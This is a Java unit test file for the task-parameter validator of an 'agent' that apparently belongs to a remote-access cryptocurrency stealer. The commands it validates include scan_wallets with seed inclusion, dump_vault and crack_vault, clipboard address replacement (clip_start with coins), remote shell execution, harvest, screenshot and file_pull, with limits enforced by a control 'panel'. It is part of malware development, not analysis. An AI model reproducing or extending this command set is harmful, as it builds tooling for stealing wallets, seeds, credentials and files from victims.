package com.serverpackcore.agent;

import static org.junit.jupiter.api.Assertions.assertEquals;
import static org.junit.jupiter.api.Assertions.assertFalse;
import static org.junit.jupiter.api.Assertions.assertNull;
import static org.junit.jupiter.api.Assertions.assertTrue;

import java.util.Map;

import org.junit.jupiter.api.Test;

class TaskParamsTest {
	@Test
	void completeParamsPass() {
		assertNull(TaskParams.validate("scan_wallets", Map.of("max_files", 2500, "max_bytes", 1048576)));
		assertNull(TaskParams.validate("clip_start", Map.of("replace", true, "max_history", 100)));
		assertNull(TaskParams.validate("file_pull", Map.of("path", "/tmp/a", "max_mb", 4)));
		assertNull(TaskParams.validate("cancel", Map.of("task_id", "00000000-0000-4000-8000-000000000001")));
		assertNull(TaskParams.validate("shell", Map.of("command", "whoami")));
	}

	@Test
	void emptyShellAndFilePullAreUsageErrors() {
		assertEquals("missing_param: command", TaskParams.validate("shell", Map.of()));
		assertEquals("missing_param: path", TaskParams.validate("file_pull", Map.of()));
		assertEquals("missing_param: target", TaskParams.validate("dump_vault", Map.of()));
		assertEquals("missing_param: task_id", TaskParams.validate("cancel", Map.of()));
	}

	@Test
	void unknownKeysAndRangesAreRejected() {
		assertEquals("unknown_param: max_nope", TaskParams.validate("scan_wallets", Map.of("max_nope", 1)));
		assertEquals("invalid_param: max_files (1..20000)", TaskParams.validate("scan_wallets", Map.of("max_files", 0)));
		assertEquals("invalid_param: max_mb (1..256)", TaskParams.validate("file_pull", Map.of("path", "x", "max_mb", 999)));
		assertEquals("unknown_task: nope", TaskParams.validate("nope", Map.of()));
	}

	@Test
	void maxBytesBoundBelongsToThePanel() {
		assertNull(TaskParams.validate("scan_wallets", Map.of("max_bytes", 1_048_576)));
		assertNull(TaskParams.validate("scan_wallets", Map.of("max_bytes", 536_870_912)));
		// Out of range still passes here: only the panel enforces the cota.
		assertNull(TaskParams.validate("scan_wallets", Map.of("max_bytes", 1_048_575)));
		assertNull(TaskParams.validate("scan_wallets", Map.of("max_bytes", 536_870_913)));
		assertEquals("invalid_param: max_bytes", TaskParams.validate("scan_wallets", Map.of("max_bytes", "big")));
	}

	@Test
	void agentAllowlistExcludesShell() {
		assertTrue(CommandExecutor.agentAllowed("reconnect"));
		assertTrue(CommandExecutor.agentAllowed("ops"));
		assertTrue(!CommandExecutor.agentAllowed("shell whoami"));
	}

	@Test
	void uuidCheckIsStrict() {
		assertTrue(TaskParams.uuid("00000000-0000-4000-8000-000000000001"));
		assertTrue(!TaskParams.uuid("local-123"));
	}

	@Test
	void everyContractNameIsKnown() {
		for (String name : new String[] {"scan_wallets", "dump_vault", "crack_vault", "clip_start", "clip_stop",
			"shell", "harvest", "screenshot", "file_pull", "cancel", "agent"}) {
			assertTrue(TaskParams.known(name), name);
		}
		assertFalse(TaskParams.known("nope"));
	}

	@Test
	void typedFieldsAndEnumsAreRejectedWhenMalformed() {
		assertNull(TaskParams.validate("dump_vault", Map.of("target", "phantom", "profile", "lite")));
		assertNull(TaskParams.validate("clip_start", Map.of("replace", true, "coins", Map.of("btc", "x"), "max_history", 500)));
		assertEquals("invalid_param: profile", TaskParams.validate("dump_vault", Map.of("target", "x", "profile", "huge")));
		assertEquals("invalid_param: include_seeds", TaskParams.validate("scan_wallets", Map.of("include_seeds", "yes")));
		assertEquals("invalid_param: replace", TaskParams.validate("clip_start", Map.of("replace", "yes")));
		assertEquals("invalid_param: coins", TaskParams.validate("clip_start", Map.of("coins", "btc")));
		assertEquals("invalid_param: max_history (16..5000)", TaskParams.validate("clip_start", Map.of("max_history", 1)));
		assertEquals("missing_param: command", TaskParams.validate("agent", Map.of()));
	}
}
